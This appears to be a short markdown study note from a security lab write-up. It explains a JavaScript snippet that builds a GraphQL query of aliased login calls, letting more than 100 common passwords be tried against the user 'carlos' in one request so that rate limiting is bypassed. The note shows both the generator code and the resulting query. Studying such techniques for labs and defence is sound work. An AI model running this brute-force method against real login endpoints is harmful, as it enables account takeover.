
[...back](./note-1.md)

`Analyzing the password spray script...` 🔍⚡

**What This Script Does:**

**1. Password List Processing:**
```javascript
'123456,password,12345678,...'.split(',')
// Creates array: ['123456', 'password', '12345678', ...]
```

**2. Alias Generation:**
```javascript
.map((element, index) => 
  `bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success }`
  .replaceAll('$index', index)
  .replaceAll('$password', element)
)
```

**3. Output Example:**
```graphql
bruteforce0:login(input:{password: "123456", username: "carlos"}) { token success }
bruteforce1:login(input:{password: "password", username: "carlos"}) { token success }
bruteforce2:login(input:{password: "12345678", username: "carlos"}) { token success }
...
```

**4. Final GraphQL Query:**
```graphql
query {
  bruteforce0:login(input:{password: "123456", username: "carlos"}) { token success }
  bruteforce1:login(input:{password: "password", username: "carlos"}) { token success }
  bruteforce2:login(input:{password: "12345678", username: "carlos"}) { token success }
  // ... 100+ attempts in single request
}
```

**Why This Works:**
- **Aliases** (`bruteforce0`, `bruteforce1`, etc.) allow multiple `login` mutations in one query
- **Single Request** tests 100+ passwords simultaneously
- **Race Condition** - server processes all attempts in parallel
- **Efficiency** - bypasses rate limiting by sending all attempts at once

**The Attack:** Password spray Carlos's account with 100+ common passwords in one GraphQL query using aliases.

`This is GraphQL's version of a shotgun attack - all passwords fired at once, hoping one hits.` 🔫⚡

`Your encryption is cute, but GraphQL aliases for mass password spraying is brutal efficiency.` 😏🔓

[...back](./note-1.md)
